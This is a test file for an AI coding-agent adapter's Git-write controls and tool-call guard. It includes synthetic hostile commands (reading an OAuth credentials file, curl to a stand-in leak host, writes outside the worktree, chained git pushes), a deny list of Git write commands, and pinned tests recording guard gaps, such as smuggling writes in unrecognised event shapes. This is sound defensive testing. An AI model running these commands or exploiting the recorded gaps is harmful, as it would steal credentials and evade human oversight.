          [REPLAY_SCRIPT, "--provider", "antigravity", "--fixture", fixturePath("success_edit"), "--", ...argv],
          { encoding: "utf8", stdio: ["pipe", "pipe", "pipe"] },
        );
      } catch {
        return undefined;
      }
    };
    expect(probe(["--version"])).toBe("0.0.1\n");
    expect(probe(["-version"])).toBe("0.0.1\n");
    expect(probe(["--help"])).toContain("SYNTHETIC help:");
    expect(probe(["-help"])).toContain("SYNTHETIC help:");
    expect(probe(["-h"])).toContain("SYNTHETIC help:");
    expect(probe(["--h"])).toContain("SYNTHETIC help:");
    expect(probe(["--version", "--prompt=ok"])).toBeUndefined();
    expect(probe(["--help", "--output-format", "stream-json"])).toBeUndefined();
    expect(probe([])).toBeUndefined();
  });
});

describe("antigravity Git declaration (T4.37, FR-GIT-01, FR-GIT-02, FR-GIT-09)", () => {
  it("declares no per-run Git write control (deny rules are settings only), leaving FR-GIT-03 and FR-GIT-06", () => {
    const c = adapter().gitWriteControl;
    expect(c.kind).toBe("none-documented");
    expect(c.remainingControls).toEqual(["FR-GIT-03", "FR-GIT-06"]);
    expect(c.detail).toBe(GIT_WRITE_CONTROL_DETAIL);
    expect(c.detail).toMatch(/settings\.json/);
    expect(c.detail).toMatch(/none per run/);
    expect(c.detail).toMatch(/FR-GIT-03/);
    expect(c.detail).toMatch(/FR-GIT-06/);
    expect(adapter().gitWriteControl).toBe(ANTIGRAVITY_GIT_WRITE_CONTROL);
  });

  it("declares finalize-only commit channel (FR-GIT-09, owner decision 36)", () => {
    const caps = adapter().gitCapabilities;
    expect(caps.commitChannel).toBe("finalize-only");
    expect(caps.detail).toMatch(/FR-GIT-09/);
    expect(caps.detail).toMatch(/mcp_config\.json/);
    expect(adapter().gitCapabilities).toBe(ANTIGRAVITY_GIT_CAPABILITIES);
  });

  it("list_capabilities reports Antigravity's Git-write declaration through MCP", async () => {
    const root = realpathSync(makeCwd());
    const dataDir = join(root, "data");
    mkdirSync(dataDir);
    const db = openLedger(dataDir);
    const ids = createIdGenerator();
    const ledger = createLedger(db, { ids });
    const artifacts = new ArtifactStore(join(dataDir, "artifacts"));
    const registry = new AdapterRegistry().register(adapter());
    const real = createProbeRunner();
    const probeRunner: ProbeRunner = async (argv, opts) =>
      argv[0] === process.execPath
        ? real(argv, opts)
        : { exitCode: null, stdout: "", stderr: "", timedOut: false, spawnError: "refused in tests" };
    const lifecycle = new RunLifecycle({
      ledger,
      workspace: new WorkspaceManager({ db, artifacts, dataDir, allowedRoots: [root], ids }),
      artifacts,
      adapters: registry,
      allowedRoots: [root],
      globalConcurrency: 1,
      resolveProfile: (name) => resolveTrustProfile(name),
      probeRunner,
      eligibility: { platform: "linux", gate: (id, v, dir) => registry.gate(id, v, dir) },
    });
    const mcp = createSwitchboardServer({
      lifecycle,
      ledger,
      artifacts,
      registry,
      config: {
        allowedRoots: [root],
        projects: [],
        mcpClients: new Map([["c1", { id: "c1", maxTrustProfile: "edit-untrusted" as const }]]),
      },
      clientId: "c1",
    });
    const client = new Client({ name: "test-client", version: "0.0.0" });
    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
    try {
      await mcp.server.connect(serverSide);
      await client.connect(clientSide);
      const res = await client.callTool({ name: "list_capabilities", arguments: {} });
      const body = JSON.parse((res.content as { text: string }[])[0]?.text ?? "{}");
      const agy = body.providers.find((p: { provider: string }) => p.provider === "antigravity");
      expect(agy).toBeDefined();
      expect(agy.git_write_control).toEqual({
        kind: "none-documented",
        detail: GIT_WRITE_CONTROL_DETAIL,
        remaining_controls: ["FR-GIT-03", "FR-GIT-06"],
      });
    } finally {
      await client.close();
      await mcp.close();
      await lifecycle.shutdown();
      db.close();
    }
  });

  it("the compiled invocation passes the prompt as one --prompt= word and carries no git command or credentials", () => {
    const profile = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    const inv = adapter().compile(request({ bypassApproved: true }), profile);
    if (isIneligible(inv)) throw new Error(`unexpected ineligible: ${inv.detail}`);
    expect(inv.argv).toContain("--prompt=--sandbox fix the failing test");
    expect(inv.stdin).toEqual({ kind: "none" });
    expect(auditInvocation(inv, { profile, bypassApproved: true })).toEqual([]);
    for (const a of inv.argv.slice(1)) expect(/\bgit\b|\bgh\b/.test(a), `argv has git: ${a}`).toBe(false);
    for (const a of inv.policyFlags) expect(/\bgit\b|\bgh\b/.test(a), `policyFlags has git: ${a}`).toBe(false);
    expect(inv.envAllowlist).toEqual(["PATH", "HOME"]);
    for (const k of Object.keys(inv.env)) {
      expect(/GIT|GITHUB|GH_|GEMINI|GOOGLE/.test(k), `env: ${k}`).toBe(false);
    }
  });

  it.each([
    "git commit",
    "git commit -m x",
    "git push",
    "git push origin main",
    "git branch -f main",
    "git update-ref refs/heads/x HEAD",
    "git tag v1",
    "gh pr create",
    "git reset --hard",
    "git merge x",
    "git rebase main",
    "git cherry-pick abc",
    "git stash",
    "git -C . commit",
    "git --git-dir=/repo/.git commit",
    "/usr/bin/git push",
    "env git commit",
    "xargs git push",
  ])("shell allowlist entry %j is Ineligible (PROFILE_UNSUPPORTED, FR-GIT-01)", (entry) => {
    const r1 = adapter().compile(request(), { ...profileOf("edit-untrusted"), shellAllowlist: [entry] });
    expect(r1).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    if (isIneligible(r1)) {
      expect(r1.detail).toContain("FR-GIT-01");
      expect(r1.detail).toContain(entry);
    }

    const r2 = adapter().compile(request({ bypassApproved: true }), {
      ...privilegedProfile(BYPASS_SCOPE),
      bypassApproved: true,
      shellAllowlist: [entry],
    });
    expect(r2).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    if (isIneligible(r2)) {
      expect(r2.detail).toContain("FR-GIT-01");
      expect(r2.detail).toContain(entry);
    }
  });

  it("read-only commands in a shell allowlist do not trigger the FR-GIT-01 rejection", () => {
    const r = adapter().compile(request(), {
      ...profileOf("edit-untrusted"),
      shellAllowlist: ["git status", "git diff", "npm test"],
    });
    expect(r).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    if (isIneligible(r)) {
      expect(r.detail).not.toContain("FR-GIT-01");
      expect(r.detail).toContain(NON_PRIVILEGED_UNSUPPORTED_DETAIL);
    }
    const ok = adapter().compile(request({ bypassApproved: true }), {
      ...privilegedProfile(BYPASS_SCOPE),
      bypassApproved: true,
      shellAllowlist: ["git status", "git diff", "npm test"],
    });
    expect(isIneligible(ok)).toBe(false);
  });

  it("a replayed write run in a finalize-only project gets the controller commit at FINALIZING", async () => {
    const root = realpathSync(makeCwd());
    const repo = join(root, "repo");
    const bare = join(root, "remote.git");
    mkdirSync(repo);
    const g = (cwd: string, ...args: string[]) =>
      execFileSync("git", ["-c", "commit.gpgsign=false", ...args], {
        cwd,
        env: {
          PATH: process.env.PATH ?? "",
          GIT_CONFIG_GLOBAL: "/dev/null",
          GIT_CONFIG_NOSYSTEM: "1",
          GIT_AUTHOR_NAME: "Antigravity Dev",
          GIT_AUTHOR_EMAIL: "antigravity@example.test",
          GIT_COMMITTER_NAME: "Antigravity Dev",
          GIT_COMMITTER_EMAIL: "antigravity@example.test",
        },
        encoding: "utf8",
      }).trim();

    g(repo, "init", "-q", "-b", "main");
    writeFileSync(join(repo, "README.md"), "initial\n");
    g(repo, "add", "-A");
    g(repo, "commit", "-q", "-m", "init");
    g(root, "init", "-q", "--bare", "-b", "main", bare);
    g(repo, "remote", "add", "origin", bare);
    g(repo, "push", "-q", "origin", "main");

    const dataDir = join(root, "data");
    mkdirSync(dataDir);
    const db = openLedger(dataDir);
    const ids = createIdGenerator();
    const ledger = createLedger(db, { ids });
    const artifacts = new ArtifactStore(join(dataDir, "artifacts"));
    const workspace = new WorkspaceManager({ db, artifacts, dataDir, allowedRoots: [root], ids });
    const finalizePublisher = new GitPublisher({
      db,
      scratchDir: join(dataDir, "git-scratch"),
      allowedStates: ["FINALIZING"],
    });
    // The replay dialect answers `--version` and `--help` only; `agy models` gets model lines in the observed shape
    // (T4.34, live check C3b).
    const real = createProbeRunner();
    const probeRunner: ProbeRunner = async (argv, opts) =>
      argv.at(-1) === AUTH_STATUS_ARGS.at(-1)
        ? { exitCode: 0, stdout: "m-flash\tModel Flash\n", stderr: "", timedOut: false }
        : real(argv, opts);
    const lifecycle = new RunLifecycle({
      ledger,
      workspace,
      artifacts,
      adapters: new AdapterRegistry().register(replayAdapter("success_edit")),
      allowedRoots: [root],
      globalConcurrency: 1,
      resolveProfile: (name) => resolveTrustProfile(name),
      probeRunner,
      finalizePublisher,
    });
    lifecycle.start();

    try {
      const { runId, metaSessionId } = await lifecycle.submit({
        clientId: "c",
        objective: "write a file with antigravity",
        workspace: repo,
        trustProfile: "privileged",
        provider: "antigravity",
        project: {
          id: "test-project",
          name: "Test Project",
          environment_kind: "host",
          context_id: "primary",
          base_ref: "main",
          effective_max_profile: "privileged",
          writable: true,
          identity: { name: "Antigravity Dev", email: "antigravity@example.test" },
          push: { policy: "branch" },
          finalize_commit: true,
        },
        privileged: {
          scope: BYPASS_SCOPE,
          approvedByClientPolicy: true,
        },
      });

      const done = await lifecycle.waitForTerminal(runId);
      expect(done.state, done.failure_detail ?? "").toBe("SUCCEEDED");

      const events = ledger.listRunEvents(runId).map((e) => ({ type: e.type, p: JSON.parse(e.payload_json) }));
      expect(events.find((e) => e.type === "state_transition" && e.p.to === "FINALIZING")).toBeDefined();
      const finCommit = events.find((e) => e.type === GIT_FINALIZE_COMMIT_EVENT);
      expect(finCommit?.p).toMatchObject({ outcome: "committed" });

      const sha = g(repo, "rev-parse", "--verify", "--quiet", publishRefFor(metaSessionId));
      expect(sha).toMatch(/^[0-9a-f]{40}$/u);
      expect(g(repo, "show", "--name-only", "--format=", sha)).toContain("hello.txt");
    } finally {
      await lifecycle.shutdown();
      db.close();
    }
  });
});

describe("antigravity backing-provider fixture (T4.35, T4.6, FR-ADP-10)", () => {
  it("a replayed run stores harness antigravity and backing vendor side by side and shows both in get_run", async () => {
    // Mirrors Grok Build T4.23 and Cursor T4.43: the parser/conformance level is pinned in the T4.33 describes;
    // this one carries the fixture through RunLifecycle into the ledger and the get_run envelope.
    const root = realpathSync(makeCwd());
    const repo = join(root, "repo");
    mkdirSync(repo);
    const g = (...args: string[]) =>
      execFileSync("git", ["-c", "commit.gpgsign=false", ...args], {
        cwd: repo,
        env: {
          PATH: process.env.PATH ?? "",
          GIT_CONFIG_GLOBAL: "/dev/null",
          GIT_CONFIG_NOSYSTEM: "1",
          GIT_AUTHOR_NAME: "Antigravity Dev",
          GIT_AUTHOR_EMAIL: "antigravity@example.test",
          GIT_COMMITTER_NAME: "Antigravity Dev",
          GIT_COMMITTER_EMAIL: "antigravity@example.test",
        },
      });
    g("init", "-q", "-b", "main");
    writeFileSync(join(repo, "README.md"), "initial\n");
    g("add", "-A");
    g("commit", "-q", "-m", "init");

    const dataDir = join(root, "data");
    mkdirSync(dataDir);
    const db = openLedger(dataDir);
    const ids = createIdGenerator();
    const ledger = createLedger(db, { ids });
    const artifacts = new ArtifactStore(join(dataDir, "artifacts"));
    const real = createProbeRunner();
    const probeRunner: ProbeRunner = async (argv, opts) => {
      if (argv.includes("models")) {
        return {
          stdout: "m-flash\tModel Flash\n",
          stderr: "",
          exitCode: 0,
          timedOut: false,
        };
      }
      return real(argv, opts);
    };
    const lifecycle = new RunLifecycle({
      ledger,
      workspace: new WorkspaceManager({ db, artifacts, dataDir, allowedRoots: [root], ids }),
      artifacts,
      adapters: new AdapterRegistry().register(replayAdapter("backing_provider")),
      allowedRoots: [root],
      globalConcurrency: 1,
      resolveProfile: (name) => resolveTrustProfile(name),
      probeRunner,
    });
    lifecycle.start();
    try {
      const { runId, metaSessionId } = await lifecycle.submit({
        clientId: "c",
        objective: "answer through a backing vendor",
        workspace: repo,
        trustProfile: "privileged",
        provider: "antigravity",
        privileged: { scope: BYPASS_SCOPE, approvedByClientPolicy: true },
      });
      const done = await lifecycle.waitForTerminal(runId);
      expect(done.state, done.failure_detail ?? "").toBe("SUCCEEDED");

      // The session_bound event's fields land on the provider binding (T5.3), never inferred from the display name.
      expect(ledger.listProviderBindings(metaSessionId)).toEqual([
        expect.objectContaining({
          provider: "antigravity",
          harness: "antigravity",
          backing_provider: "backing-g",
          model: "synthetic-model",
          native_session_id: DEFAULT_SESSION_ID,
        }),
      ]);

      const rows = ledger.listUsageObservationsForRun(runId);
      expect(rows).toHaveLength(1);
      expect(rows[0]).toMatchObject({
        provider: "antigravity",
        harness: "antigravity",
        backing_provider: "backing-g",
        model: "synthetic-model",
        source: "provider_reported",
      });
      expect(buildEnvelope(ledger, done, (s) => s).usage?.reported).toEqual([
        expect.objectContaining({
          harness: "antigravity",
          backing_provider: "backing-g",
          model: "synthetic-model",
        }),
      ]);
    } finally {
      await lifecycle.shutdown();
      db.close();
    }
  });
});

describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-POL-06; SYNTHETIC lines)", () => {
  // The shared leg is test/malicious/adapters/antigravity.case.ts; these pin what is specific to Antigravity.
  const CID = "0b6c2d1e-0000-4000-8000-0000000000bb";
  const HOME = "/home/synthetic";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const tool = (name: string, parameters: Record<string, string>) =>
    j({
      event: "step_update",
      conversation_id: CID,
      step_index: 1,
      state: "ACTIVE",
      step_type: "tool",
      tool_name: name,
      tool_info: { name, parameters },
    });
  const result = (over: Record<string, unknown> = {}) =>
    j({ event: "result", result: { conversation_id: CID, status: "SUCCESS", response: "", usage: USAGE, ...over } });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  /** Lines through the parser and the tool-call guard as an approved bypass run sees them, then the result. */
  const run = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const ctx = { cwd: "/work/tree", home: HOME, bypass: true };
    const events = lines.flatMap((l) => a.parseEvent(l, state)).map((e) => guardEvent(e, ctx));
    return { events, result: a.extractResult(events, EXIT0) };
  };

  it.each(["disabled", "approved"] as const)(
    "repository_config %s is refused, never compiled as enabled (FR-POL-04 is not shown; live check C11)",
    (mode) => {
      const profile = { ...privilegedProfile({ ...BYPASS_SCOPE, repository_config: { mode } }), bypassApproved: true };
      const r = adapter().compile(request({ bypassApproved: true }), profile);
      expect(r).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING" });
      if ("ineligible" in r) expect(r.detail).toContain("C11");
    },
  );

  it("the compiled argv and env name no Antigravity state directory or repository instruction source", () => {
    const r = compiled();
    const text = [...r.argv, ...Object.keys(r.env), ...Object.values(r.env)].join("\n");
    for (const s of [".gemini", "GEMINI.md", "AGENTS.md", ".agents", "mcp_config.json", "hooks.json"]) {
      expect(text, s).not.toContain(s);
    }
  });

  it.each([
    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
  ])("a reported denial of a %s ends PERMISSION_BLOCKED at exit 0 although status is SUCCESS", (_n, name, params) => {
    const { result: r } = run([
      tool(name, params),
      result({ denied_actions: [{ action: "synthetic", display_name: "Synthetic" }] }),
    ]);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  // The gap the leg's streams do not hide: in an approved bypass run the guard enforces only Git writes (ADR-0039,
  // owner decision 25) and `--dangerously-skip-permissions` approves every tool ([H]), so the same calls with no
  // reported denial end ok. If this starts failing, a control was added: update the T4.36 roadmap row.
  it.each([
    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
  ])("bypass gap pinned: an unreported %s with no denial ends ok", (_n, name, params) => {
    const { events, result: r } = run([tool(name, params), result()]);
    expect(events.some((e) => e.kind === "tool_call" && e.violation !== undefined)).toBe(false);
    expect(r.ok).toBe(true);
  });

  it("the guard flags a Git write in the bypass run and classifies it PERMISSION_BLOCKED (ADR-0017, ADR-0039)", () => {
    const { events } = run([tool("run_command", { command: "git push origin main" }), result()]);
    expect(events).toContainEqual(expect.objectContaining({ kind: "tool_call", violation: expect.anything() }));
    expect(events.some((e) => e.kind === "tool_call" && "command" in e)).toBe(false);
    expect(
      adapter().classifyFailure({ events, exit: EXIT0, stderrTail: "", timedOut: false, cancelled: false }),
    ).toEqual(expect.objectContaining({ code: "PERMISSION_BLOCKED" }));
  });

  // The leg's "no denial" streams: a hostile command chained with a Git write, under a SUCCESS envelope with no
  // `denied_actions` (the bypass cell's expected shape), ends blocked on the guard verdict alone (ADR-0039).
  it.each([
    ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
    ["out-of-worktree write", "touch /outside/sentinel.txt && git push origin HEAD"],
    ["network call", "curl https://example.invalid/leak && git push origin main"],
  ])("a %s chained with a Git write and no denial ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
    const { events, result: r } = run([tool("run_command", { command }), result()]);
    expect(events.some((e) => e.kind === "permission_denied")).toBe(false);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(r.failureDetail).toContain("git write attempted");
  });

  // Formerly a KNOWN GAP (T4.36 roadmap row): ADR-0039 says a `git_write` verdict ends the run PERMISSION_BLOCKED, and
  // the lifecycle trusts `result.ok`, so `extractResult` must not call a flagged run clean even with a SUCCESS envelope.
  it("a guard-flagged Git write with a SUCCESS envelope ends PERMISSION_BLOCKED (ADR-0039)", () => {
    const { result: r } = run([tool("run_command", { command: "git push origin main" }), result()]);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(r.failureDetail).toContain("git write attempted");
  });

  // The leg's "after the result line" streams: the hostile call arrives after a clean SUCCESS envelope. A trailing
  // call is never a success; a Git write in it ends PERMISSION_BLOCKED on the guard verdict (ADR-0039).
  it.each([
    ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
    ["out-of-worktree write", "touch /outside/sentinel.txt && git push origin HEAD"],
    ["network call", "curl https://example.invalid/leak && git push origin main"],
  ])("a %s chained with a Git write after the result line ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
    const { result: r } = run([result(), tool("run_command", { command })]);
    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(r.failureDetail).toContain("git write attempted");
  });

  it.each([
    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
  ])("an unflagged %s after the result line is not a success (OUTPUT_PROTOCOL_ERROR)", (_n, name, params) => {
    const { result: r } = run([result(), tool(name, params)]);
    expect(r).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "tool call after the result line",
    });
  });

  it("any guard verdict on a tool_call makes a SUCCESS envelope not clean (a provider_state verdict ends SANDBOX_VIOLATION)", () => {
    const { events } = run([result()]);
    const flagged: NormalizedEvent = {
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      violation: { kind: "provider_state", reason: "synthetic" },
    };
    expect(adapter().extractResult([flagged, ...events], EXIT0)).toMatchObject({
      ok: false,
      failureCode: "SANDBOX_VIOLATION",
    });
  });

  // Residual pins (T4.36): the tests above fold lines in process; these replay the same hostile shapes through the
  // supervisor (`startAdapterRun`) with the shared replay helper in place of `agy`, at exit 0 and exit 1, so the spawn
  // path, the run's own guard context and the exit status take part in the verdict. Each stream is written to a temp
  // directory, not to fixtures/, so the T4.35 fixture inventory is unchanged. SYNTHETIC lines; no `agy` is run.
  describe("adapter replay through the supervisor (T4.36 residuals; SYNTHETIC streams)", () => {
    const OUTSIDE = makeCwd();
    writeFileSync(join(OUTSIDE, "sentinel.txt"), "outside\n");
    // The replay helper refuses a stream without a SYNTHETIC provenance line (`requireSynthetic`).
    const PROVENANCE = j({
      _fixture: { synthetic: true, note: "SYNTHETIC: written by the T4.36 adapter replay residual tests" },
    });
    const INIT = j({
      event: "init",
      conversation_id: CID,
      init: { cwd: "/work/tree", tools: ["run_command", "write_to_file"], permission_mode: "always-proceed" },
    });
    const step = (index: number, name: string, parameters: Record<string, string>) => [
      j({
        event: "step_update",
        conversation_id: CID,
        step_index: index,
        state: "ACTIVE",
        step_type: "tool",
        tool_name: name,
        tool_info: { name, parameters },
      }),
      j({ event: "step_update", conversation_id: CID, step_index: index, state: "DONE", step_type: "tool" }),
    ];
    const denied = (display: string) => result({ denied_actions: [{ action: "synthetic", display_name: display }] });
    const PUSH = "git write attempted: `git push` can create commits, change refs or push";
    const COMMIT = "git write attempted: `git push` can create commits, change refs or push";
    // [category, tool name, parameters, denial display name]
    const HOSTILE: [string, string, Record<string, string>, string][] = [
      ["credential read", "run_command", { command: "cat ~/.gemini/oauth_creds.json" }, "RunCommand"],
      ["out-of-worktree write", "write_to_file", { path: join(OUTSIDE, "sentinel.txt") }, "WriteToFile"],
      ["network call", "run_command", { command: "curl https://example.invalid/leak" }, "RunCommand"],
    ];
    // [category, shell command chained with a Git write, guard detail]
    const GUARDED: [string, string, string][] = [
      ["credential read", "cat ~/.gemini/oauth_creds.json && git push origin main", PUSH],
      ["out-of-worktree write", `touch ${join(OUTSIDE, "sentinel.txt")} && git push origin HEAD`, COMMIT],
      ["network call", "curl https://example.invalid/leak && git push origin main", PUSH],
    ];
    const atExits = <T extends unknown[]>(rows: T[]) =>
      rows.flatMap((r) => [0, 1].map((x) => [x, ...r] as [number, ...T]));

    /** Replays `lines` after a recorded-shape `init` under the supervisor; the checkout and outside sentinel must stay. */
    const replay = async (lines: string[], exitCode: number) => {
      const file = join(makeCwd(), "stream.jsonl");
      writeFileSync(file, `${[PROVENANCE, INIT, ...lines].join("\n")}\n`);
      const cwd = makeCwd();
      writeFileSync(join(cwd, "README.md"), "hostile checkout\n");
      const a = new AntigravityAdapter({
        executable: process.execPath,
        launcherArgs: replayLauncher("antigravity", file, ["--exit-code", String(exitCode)]),
        timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
      });
      const inv = a.compile(
        request({
          objective: "synthetic antigravity objective",
          workspace: { cwd, writable: true },
          bypassApproved: true,
        }),
        PRIVILEGED_BYPASS_PROFILE,
      );
      if (isIneligible(inv)) throw new Error(`ineligible: ${inv.reason}`);
      const events: NormalizedEvent[] = [];
      const outcome = await startAdapterRun(a, inv, {
        profile: PRIVILEGED_BYPASS_PROFILE,
        bypassApproved: true,
        onEvent: (e) => events.push(e),
      }).done;
      expect(outcome.groupEmpty).toBe(true);
      expect(readdirSync(cwd)).toEqual(["README.md"]);
      expect(readFileSync(join(OUTSIDE, "sentinel.txt"), "utf8")).toBe("outside\n");
      return { events, result: outcome.result };
    };
    const flagged = (events: NormalizedEvent[]) => events.filter((e) => e.kind === "tool_call" && e.violation);

    it.each(atExits(HOSTILE))(
      "at exit %i a soft-denied %s replays to PERMISSION_BLOCKED",
      async (exitCode, _n, name, params, display) => {
        const { events, result: r } = await replay([...step(1, name, params), denied(display)], exitCode);
        expect(events.filter((e) => e.kind === "permission_denied")).toHaveLength(1);
        expect(flagged(events)).toEqual([]);
        expect(r).toEqual({
          ok: false,
          failureCode: "PERMISSION_BLOCKED",
          failureDetail: `denied: ${display}`,
          nativeSessionId: CID,
          unknownEventCount: 0,
        });
      },
    );

    it.each(atExits(GUARDED))(
      "at exit %i a %s chained with a Git write and no denial replays to PERMISSION_BLOCKED on the guard alone (ADR-0039)",
      async (exitCode, _n, command, detail) => {
        const { events, result: r } = await replay([...step(1, "run_command", { command }), result()], exitCode);
        expect(events.some((e) => e.kind === "permission_denied")).toBe(false);
        expect(flagged(events)).toHaveLength(1);
        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
        expect(r.nativeSessionId).toBe(CID);
      },
    );

    it.each(atExits(GUARDED))(
      "at exit %i a soft denial beside a guarded %s: the guard verdict names the detail",
      async (exitCode, _n, command, detail) => {
        const { result: r } = await replay([...step(1, "run_command", { command }), denied("RunCommand")], exitCode);
        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
      },
    );

    // The bypass gap through the real spawn path: no denial and no Git write leaves only the exit status to decide.
    // If the exit 0 rows start failing, a control was added: update the T4.36 roadmap row.
    it.each(HOSTILE)(
      "bypass gap pinned through the replay: an unreported %s ends ok at exit 0",
      async (_n, name, params) => {
        const { events, result: r } = await replay([...step(1, name, params), result()], 0);
        expect(flagged(events)).toEqual([]);
        expect(r).toEqual({ ok: true, nativeSessionId: CID, unknownEventCount: 0 });
      },
    );

    it.each(HOSTILE)(
      "the same unreported %s at exit 1 is TOOL_FAILURE from the exit status, never PERMISSION_BLOCKED",
      async (_n, name, params) => {
        const { result: r } = await replay([...step(1, name, params), result()], 1);
        expect(r).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
      },
    );

    it.each(HOSTILE)(
      "an unflagged %s after the result line: OUTPUT_PROTOCOL_ERROR at exit 0, TOOL_FAILURE `exit code 1` at exit 1",
      async (_n, name, params) => {
        const at0 = await replay([result(), ...step(1, name, params)], 0);
        expect(at0.result).toMatchObject({
          ok: false,
          failureCode: "OUTPUT_PROTOCOL_ERROR",
          failureDetail: "tool call after the result line",
        });
        // The exit status outranks the trailing-call detail, which is only set for OUTPUT_PROTOCOL_ERROR.
        const at1 = await replay([result(), ...step(1, name, params)], 1);
        expect(at1.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
      },
    );

    it.each(atExits(GUARDED))(
      "at exit %i a %s chained with a Git write after the result line replays to PERMISSION_BLOCKED",
      async (exitCode, _n, command, detail) => {
        const { result: r } = await replay([result(), ...step(1, "run_command", { command })], exitCode);
        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
      },
    );

    it.each(HOSTILE)(
      "an unflagged %s with no result line: OUTPUT_PROTOCOL_ERROR at exit 0, TOOL_FAILURE at exit 1",
      async (_n, name, params) => {
        const at0 = await replay(step(1, name, params), 0);
        expect(at0.result).toMatchObject({
          ok: false,
          failureCode: "OUTPUT_PROTOCOL_ERROR",
          failureDetail: "no result event",
        });
        const at1 = await replay(step(1, name, params), 1);
        expect(at1.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
      },
    );

    it.each(atExits(GUARDED))(
      "at exit %i a %s chained with a Git write and no result line replays to PERMISSION_BLOCKED",
      async (exitCode, _n, command, detail) => {
        const { result: r } = await replay(step(1, "run_command", { command }), exitCode);
        expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", failureDetail: detail });
      },
    );

    // Gap pinned: only a `step_update` with `step_type` `tool` reaches the guard (FR-ADP-04 reads nothing from an
    // unrecognised shape), so a Git write inside an unknown event kind is counted unknown and never flagged. With a
    // SUCCESS envelope at exit 0 the run ends ok. If this starts failing, update the T4.36 roadmap row.
    it("gap pinned: a Git write inside unrecognised event kinds is only counted unknown; ok at exit 0, TOOL_FAILURE at exit 1", async () => {
      const smuggled = [
        j({ event: "tool_call", conversation_id: CID, command: "git push origin main" }),
        j({
          event: "Step_Update",
          conversation_id: CID,
          step_index: 1,
          step_type: "tool",
          tool_name: "run_command",
          tool_info: { name: "run_command", parameters: { command: "git push origin main" } },
        }),
        j({
          conversation_id: CID,
          tool_info: { name: "run_command", parameters: { command: "git push origin main" } },
        }),
      ];
      const at0 = await replay([...smuggled, result()], 0);
      expect(at0.events.some((e) => e.kind === "tool_call")).toBe(false);
      expect(at0.result).toEqual({ ok: true, nativeSessionId: CID, unknownEventCount: 3 });
      const at1 = await replay([...smuggled, result()], 1);
      expect(at1.result).toMatchObject({
        ok: false,
        failureCode: "TOOL_FAILURE",
        failureDetail: "exit code 1",
        unknownEventCount: 3,
      });
    });
  });
});

describe("antigravity parser residual pins (T4.33, synthetic shapes)", () => {
  // Branches of `parseEvent` no earlier block pins. Synthetic lines only, no new capture, parser unchanged.
  const CID = "0b6c2d1e-0000-4000-8000-0000000000cc";
  const OTHER = "0b6c2d1e-0000-4000-8000-0000000000cd";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const INIT = (init: Record<string, unknown> = {}, outer: Record<string, unknown> = {}) =>
    j({ event: "init", conversation_id: CID, ...outer, init: { cwd: "/work/tree", ...init } });
  const STEP = (o: Record<string, unknown>) => j({ event: "step_update", conversation_id: CID, state: "DONE", ...o });
  const RESULT = (over: Record<string, unknown> = {}, outer: Record<string, unknown> = {}) =>
    j({
      event: "result",
      ...outer,
      result: { conversation_id: CID, status: "SUCCESS", response: "ok", usage: USAGE, ...over },
    });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  /** Lines through the parser and the tool-call guard as an approved bypass run sees them, then the result. */
  const run = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const raw = lines.flatMap((l) => a.parseEvent(l, state));
    const events = raw.map((e) => guardEvent(e, { cwd: "/work/tree", home: "/home/synthetic", bypass: true }));
    return { state, raw, events, result: a.extractResult(events, EXIT0) };
  };
  const bound = (lines: string[]) => run(lines).raw.filter((e) => e.kind === "session_bound");

